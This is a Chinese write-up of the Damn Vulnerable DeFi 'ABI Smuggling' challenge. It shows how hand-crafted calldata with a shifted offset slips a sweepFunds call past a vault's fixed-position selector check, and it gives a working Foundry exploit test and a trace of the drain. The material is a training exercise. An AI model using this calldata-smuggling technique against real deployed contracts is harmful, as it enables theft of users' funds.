## 题目 [ABI Smuggling](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/abi-smuggling)

有一个拥有 100 万 DVT 代币存款的许可金库。该金库允许定期提取资金，并在紧急情况下提取所有资金。  

该合约内嵌了一个通用授权机制，只允许已知账户执行特定操作。  

开发团队收到了一个负责任的披露，指出所有资金可能会被盗。  

请从金库中拯救所有资金，并将其转移到指定的恢复账户。  

## 题解
根据测试文件，可以看出我们作为玩家是可以调用 `withdraw` 函数，部署者才能调用 `sweepFunds`，这些都通过 `setPermissions` 进行了初始化。  

但是在 `execute` 函数中，检查能否调用的方法为，`getActionId(selector, msg.sender, target)`，而其中 `selector` 字段是直接通过 calldata 的 `4 + 32 * 3` 开始的位置读的。而 Solidity 对于可变长度的数据，ABI 采用了指针和数据分离的方式进行编码，我们可以手动设置一个偏移量。
``` solidity
    function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
        // Read the 4-bytes selector at the beginning of `actionData`
        bytes4 selector;
        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
        assembly {
            selector := calldataload(calldataOffset)
        }

        if (!permissions[getActionId(selector, msg.sender, target)]) {
            revert NotAllowed();
        }

        _beforeFunctionCall(target, actionData);

        return target.functionCall(actionData);
    }
```
于是我们可以构造以下的 `calldata`：
```
0x1cff79cd                                                        // execute
0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264  // SelfAuthorizedVault
0000000000000000000000000000000000000000000000000000000000000080  // 偏移量 (0x80)，即 actionData 从 00..44 开始。
0000000000000000000000000000000000000000000000000000000000000000  // 仅占位用
d9caed1200000000000000000000000000000000000000000000000000000000  // withdraw
0000000000000000000000000000000000000000000000000000000000000044  // 68 bytes
85fb709d                                                          // sweepFunds
00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea  // recovery
0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b  // DamnValuableToken
```
之后不仅可以通过 `permissions[getActionId(selector, msg.sender, target)]` 的检查, 并且 `actionData` 是 `85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b`，从而执行紧急提款操作。

POC：  
``` solidity
    function test_abiSmuggling() public checkSolvedByPlayer {
        bytes4 executeSelector = vault.execute.selector;
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
        bytes memory emptyData = abi.encodePacked(uint256(0));
        bytes memory withdrawSelectorPadded = abi.encodePacked(bytes4(0xd9caed12), bytes28(0));
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(vault.sweepFunds.selector, recovery, token);
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));
        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,
            target,
            dataOffset,
            emptyData,
            withdrawSelectorPadded,
            actionDataLength,
            sweepFundsCalldata
        );

        address(vault).call(calldataPayload);
    }
```
运行测试：
```
forge test --mp test/abi-smuggling/ABISmuggling.t.sol -vvvv
```
测试结果：
```
[PASS] test_abiSmuggling() (gas: 57332)
Traces:
  [64932] ABISmugglingChallenge::test_abiSmuggling()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return] 
    ├─ [43547] SelfAuthorizedVault::execute(SelfAuthorizedVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 0x85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b)
    │   ├─ [33748] SelfAuthorizedVault::sweepFunds(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b])
    │   │   ├─ [2519] DamnValuableToken::balanceOf(SelfAuthorizedVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   ├─ [27674] DamnValuableToken::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: SelfAuthorizedVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1000000000000000000000000 [1e24])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 0x
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(SelfAuthorizedVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Vault still has tokens") [staticcall]
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 
```

